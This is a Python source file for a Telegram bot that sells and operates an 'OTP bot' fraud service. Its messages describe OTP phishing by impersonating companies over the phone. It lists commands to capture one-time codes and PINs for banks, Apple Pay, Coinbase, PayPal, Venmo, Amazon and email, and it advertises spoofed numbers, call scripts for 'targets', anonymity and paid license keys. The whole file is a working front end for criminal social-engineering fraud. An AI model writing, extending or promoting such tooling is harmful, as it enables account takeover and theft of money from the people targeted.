from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram import Bot
from utils import get_user_info, user_exists, add_user, get_user_count, escape_markdown
from config import get_admin, get_groups, get_image

def start_message():
    return fr"""📲 *M9WD OTP BOT*

❓ Here you can find frequently asked questions that we have compiled for you in an organized and user\-friendly manner\. They'll be updated as we go\!

ℹ️ OTP Phishing is when you make a call pretending to be from a certain company requesting for OTP Code sent to the device\. For example, if you tried to login into an account protected by OTP, you could make the call pretending to be the service itself requesting the OTP Code for Account Security Purposes and it will get sent back to you\."""

def admin_start_message(name):
    return fr"""🔥 Welcome back, {name}\!

👑 You’re logged in as the Admin of *M9WD OTP BOT*\.  
Manage users, keys, and sales — your control center awaits ⚙️
"""

def start_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="✨ Features", callback_data="features"),
                InlineKeyboardButton(text="🤖 Commands", callback_data="help"),
            ],
            [
                InlineKeyboardButton(text="📞 Support", url=get_admin()['link']),
                InlineKeyboardButton(text="🛒 Purchase", callback_data="purchase")
            ],
            [
                InlineKeyboardButton(text="🌐 Community", url=get_groups()['main_channel_link']),
                InlineKeyboardButton(text="📃 Vouches", url=get_groups()['vouches_LINK'])
            ]
        ]
        )

def admin_start_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔑 Keys", callback_data='keys'),
            InlineKeyboardButton(text="⚙️ Commands", callback_data="help")
        ],
        [
            
            InlineKeyboardButton(text="🔑 generate keys", callback_data='g_keys')
        ]
    ])

async def start_command(message: Message, bot:Bot):
    user_id = message.from_user.id
    if not(await get_user_info(user_id,'banned')):
        name = message.from_user.first_name
        if await user_exists(user_id)==False:
            await add_user(user_id)
            if message.from_user.username:
                username = "@"+message.from_user.username
            else:
                username = 'N/A'
            await bot.send_message(chat_id=6974962502,text=fr'''🆕 *New user*: {await get_user_count()}
*Username*\: {escape_markdown(username)}
*Name*\: `{escape_markdown(name)}`
*User ID*\: `{str(user_id)}`''',parse_mode='MarkdownV2')
        if user_id in get_admin()['id']:
            await message.answer(admin_start_message(name), reply_markup=admin_start_keyboard(),parse_mode='MarkdownV2')
            return
        await message.answer_photo(get_image(),caption=start_message(), reply_markup=start_keyboard(),parse_mode='MarkdownV2')

async def start_callback(callback: CallbackQuery, bot:Bot):
    user_id = callback.from_user.id
    if not(await get_user_info(user_id,'banned')):
        name = callback.from_user.first_name
        await callback.message.delete()
        if user_id in get_admin()['id']:
            await callback.message.answer(admin_start_message(name), reply_markup=admin_start_keyboard(),parse_mode='MarkdownV2')
            return
        await callback.message.answer_photo(get_image(),caption=start_message(), reply_markup=start_keyboard(),parse_mode='MarkdownV2')

async def unknown_command(message: Message):
    user_id = message.from_user.id
    if not(await get_user_info(user_id,'banned')):
        await message.answer("❌ Unknown command.")

async def help_command(message: Message):
    user_id = message.from_user.id
    if await get_user_info(user_id,'banned'): return
    keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🛒 Purchase", callback_data="purchase")
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                ]
            ]
            )
    await message.answer(r"""📲 M9WD OTP BOT

🅐  𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
📂 /plan: View your subscription 📊
📂 /redeem: Claim your license key 🔑
📂 /purchase: Buy a subscription 🧺
📂 /phonelist: Check spoof numbers 📞

🅐  𝗖𝗮𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
📁 /call: Capture any OTP Code 📲
📁 /pin: Capture any Pin Code 🏦
📁 /bank: Capture any Bank OTP 🏦
📁 /apple: Capture ApplePay OTP 💻
📁 /coinbase: Capture Coinbase OTP 📲
📁 /paypal: Capture OTP for PayPal 📲
📁 /venmo: Capture OTP for Venmo 📲
📁 /amazon: Capture Amazon OTP 🔆
📁 /email: Capture Email OTP 📲""", reply_markup=keyboard)

async def help_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if await get_user_info(user_id,'banned'): return
    keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🛒 Purchase", callback_data="purchase")
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                ]
            ]
            )
    await callback.message.delete()
    await callback.message.answer(r"""📲 M9WD OTP BOT

🅐  𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
📂 /plan: View your subscription 📊
📂 /redeem: Claim your license key 🔑
📂 /purchase: Buy a subscription 🧺
📂 /phonelist: Check spoof numbers 📞

🅐  𝗖𝗮𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
📁 /call: Capture any OTP Code 📲
📁 /pin: Capture any Pin Code 🏦
📁 /bank: Capture any Bank OTP 🏦
📁 /apple: Capture ApplePay OTP 💻
📁 /coinbase: Capture Coinbase OTP 📲
📁 /paypal: Capture OTP for PayPal 📲
📁 /venmo: Capture OTP for Venmo 📲
📁 /amazon: Capture Amazon OTP 🔆
📁 /email: Capture Email OTP 📲""", reply_markup=keyboard)
    
async def features_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if await get_user_info(user_id,'banned'):return
    keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="🛒 Purchase", callback_data="purchase")
        ],
        [
            InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
        ]
    ]
    )
    await callback.message.delete()
    await callback.message.answer("""📲 M9WD OTP BOT
    
    🅐 Discover M9WD OTP BOT, packed with mind-blowing social engineering capabilities, unbeatable prices, and 24/7 support. Stay updated with our cutting-edge features.
    
    ┏ 🎓 Exclusive Features
    ┗ Explore M9wdOTP loaded with awe-inspiring social engineering functionalities that will enhance your chances of success.
    
    ┏ 💰 Prices Never Seen Before
    ┗ Get the most affordable OTP Bot, offering the lowest prices in the market.
    
    ┏ 📝 Personalized Call Scripts
    ┗ Tailor the conversation with your targets using customizable call scripts, including variables for easy reuse.
    
    ┏ ⚡️ Exceptional Performance
    ┗ M9wdOTP ensures uninterrupted service, guaranteeing you an outstanding user experience.
    
    ┏ 🎯 Outstanding Successrate
    ┗ Maximize your chances of successfully capturing targets with our specially designed OTP Bot.
    
    ┏ 👤 User Experience
    ┗ Thoroughly examined by active users & testers, M9wdOTP is dependable and capable to exceptional outcomes..
    
    ┏ 👣 Privacy Prioritized

    ┗ With your privacy in mind, M9wdOTP ensures complete anonymity, safeguarding your identity.""",reply_markup=keyboard)
